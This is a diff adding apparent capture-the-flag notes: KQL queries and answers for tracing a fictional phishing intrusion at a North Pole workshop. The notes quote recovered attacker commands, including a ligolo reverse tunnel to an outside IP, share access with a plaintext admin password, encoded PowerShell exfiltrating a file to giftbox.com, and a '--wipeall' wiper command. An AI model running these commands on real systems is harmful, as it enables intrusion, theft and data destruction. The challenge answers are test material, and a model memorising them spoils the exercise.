@@ -1,0 +1,159 @@
+created cluster
+https://kvc-2mjdxg9pe6v10s1xkq.southcentralus.kusto.windows.net
+
+Which employee has the IP address 10.10.0.19?
+
+Employees
+| where ip_addr == "10.10.0.19"
+
+Candy Cane Sugarplum
+
+How many emails did Santa Claus receive?
+
+Email
+| where recipient == "santa_claus@santaworkshopgeeseislands.org"
+| summarize count() by recipient
+
+the rest of the tutorial does not work. the names are wrong, the samples don't work, and there is no clear correct answer
+
+
+--
+
+how many craftperson elfs are wroking from laptops?
+25
+
+Employees
+| where hostname contains "LAPTOP"
+| where role == "Craftsperson Elf"
+| distinct name
+| count 
+
+---
+
+The alert says the user clicked the malicious link 'http://madelvesnorthpole.org/published/search/MonthlyInvoiceForReindeerFood.docx'
+
+OutboundNetworkEvents
+| where url == "http://madelvesnorthpole.org/published/search/MonthlyInvoiceForReindeerFood.docx"
+
+Employees
+| where ip_addr == "10.10.0.4"
+
+What is the email address of the employee who received this phishing email?
+alabaster_snowball@santaworkshopgeeseislands.org
+
+What is the email address that was used to send this spear phishing email?
+
+Email
+| where link == "http://madelvesnorthpole.org/published/search/MonthlyInvoiceForReindeerFood.docx"
+
+cwombley@gmail.com
+
+What was the subject line used in the spear phishing email?
+[EXTERNAL] Invoice foir reindeer food past due
+
+
+Case 2
+
+Employees 
+| where email_addr == "alabaster_snowball@santaworkshopgeeseislands.org"
+| project role,hostname,ip_addr
+
+What is the role of our victim in the organization?
+Head Elf
+
+What is the hostname of the victim's machine?
+Y1US-DESKTOP
+
+What is the source IP linked to the victim?
+10.10.0.4
+
+
+Case 3
+
+
+What time did Alabaster click on the malicious link? Make sure to copy the exact timestamp from the logs!
+2023-12-02T10:12:42Z
+(if incorrect check SecurityAlerts instead of outbound network)
+
+What file is dropped to Alabaster's machine shortly after he downloads the malicious file?
+FileCreationEvents
+| where hostname == "Y1US-DESKTOP"
+| where timestamp > datetime("2023-12-02T10:12:42Z")
+
+giftwrap.exe
+
+
+Case 4
+
+ProcessEvents
+| where hostname == "Y1US-DESKTOP" 
+| where timestamp > datetime("2023-12-02T10:12:42Z")
+
+The attacker created an reverse tunnel connection with the compromised machine. What IP was the connection forwarded to?
+
+"ligolo" --bind 0.0.0.0:1251 --forward 127.0.0.1:3389 --to 113.37.9.17:22 --username rednose --password falalalala --no-antispoof
+113.37.9.17
+
+What is the timestamp when the attackers enumerated network shares on the machine?
+where process_commandline == "net share"
+
+2023-12-02T16:51:44Z
+
+net view
+2023-12-02T16:44:10Z
+
+
+What was the hostname of the system the attacker moved laterally to?
+
+
+NorthPolefileshare
+
+cmd.exe /C net use \\NorthPolefileshare\c$ /user:admin AdminPass123 at 2023-12-24T15:14:25Z
+
+Case 5
+
+ProcessEvents
+| where hostname == "Y1US-DESKTOP"
+| where process_commandline contains "powershell" and process_commandline contains "enc"
+
+C:\Windows\System32\powershell.exe -Nop -ExecutionPolicy bypass -enc KCAndHh0LnRzaUxlY2lOeXRoZ3VhTlxwb3Rrc2VEXDpDIHR4dC50c2lMZWNpTnl0aGd1YU5cbGFjaXRpckNub2lzc2lNXCRjXGVyYWhzZWxpZmVsb1BodHJvTlxcIG1ldEkteXBvQyBjLSBleGUubGxlaHNyZXdvcCcgLXNwbGl0ICcnIHwgJXskX1swXX0pIC1qb2luICcn
+( 'txt.tsiLeciNythguaN\potkseD\:C txt.tsiLeciNythguaN\lacitirCnoissiM\$c\erahselifeloPhtroN\\ metI-ypoC c- exe.llehsrewop' -split '' | %{$_[0]}) -join ''
+
+\\NorthPolefileshare\c$\MissionCritical\NaughtyNiceList.txt C:\Desktop\NaughtyNiceList.txt'
+
+W1N0UmlOZ106OkpvSW4oICcnLCBbQ2hhUltdXSgxMDAsIDExMSwgMTE5LCAxMTAsIDExOSwgMTA1LCAxMTYsIDEwNCwgMTE1LCA5NywgMTEwLCAxMTYsIDk3LCA0NiwgMTAxLCAxMjAsIDEwMSwgMzIsIDQ1LCAxMDEsIDEyMCwgMTAyLCAxMDUsIDEwOCwgMzIsIDY3LCA1OCwgOTIsIDkyLCA2OCwgMTAxLCAxMTUsIDEwNywgMTE2LCAxMTEsIDExMiwgOTIsIDkyLCA3OCwgOTcsIDExNywgMTAzLCAxMDQsIDExNiwgNzgsIDEwNSwgOTksIDEwMSwgNzYsIDEwNSwgMTE1LCAxMTYsIDQ2LCAxMDAsIDExMSwgOTksIDEyMCwgMzIsIDkyLCA5MiwgMTAzLCAxMDUsIDEwMiwgMTE2LCA5OCwgMTExLCAxMjAsIDQ2LCA5OSwgMTExLCAxMDksIDkyLCAxMDIsIDEwNSwgMTA4LCAxMDEpKXwmICgoZ3YgJypNRHIqJykuTmFtRVszLDExLDJdLWpvaU4=
+
+
+C:\Windows\System32\powershell.exe -Nop -ExecutionPolicy bypass -enc QzpcV2luZG93c1xTeXN0ZW0zMlxkb3dud2l0aHNhbnRhLmV4ZSAtLXdpcGVhbGwgXFxcXE5vcnRoUG9sZWZpbGVzaGFyZVxcYyQ=
+C:\Windows\System32\downwithsanta.exe --wipeall \\\\NorthPolefileshare\\c$
+
+
+
+
+When was the attacker's first base64 encoded PowerShell command executed on Alabaster's machine?
+C:\Windows\System32\powershell.exe -Nop -ExecutionPolicy bypass -enc KCAndHh0LnRzaUxlY2lOeXRoZ3VhTlxwb3Rrc2VEXDpDIHR4dC50c2lMZWNpTnl0aGd1YU5cbGFjaXRpckNub2lzc2lNXCRjXGVyYWhzZWxpZmVsb1BodHJvTlxcIG1ldEkteXBvQyBjLSBleGUubGxlaHNyZXdvcCcgLXNwbGl0ICcnIHwgJXskX1swXX0pIC1qb2luICcn
+2023-12-24T16:07:47Z
+
+What was the name of the file the attacker copied from the fileshare? (This might require some additional decoding)
+NaughtyNiceList.txt
+
+The attacker has likely exfiltrated data from the file share. What domain name was the data exfiltrated to?
+giftbox.com
+
+
+2023-12-24T16:07:47Z
+NaughtyNiceList.txt
+giftbox.com
+
+I don't know why they didn't accept this before x.x
+
+Case 6
+
+What is the name of the executable the attackers used in the final malicious command?
+
+What was the command line flag used alongside this executable?
+downwithsanta.exe --wipeall
+
+
+print base64_decode_tostring('QmV3YXJlIHRoZSBDdWJlIHRoYXQgV29tYmxlcw==')
+Beware the Cube that Wombles
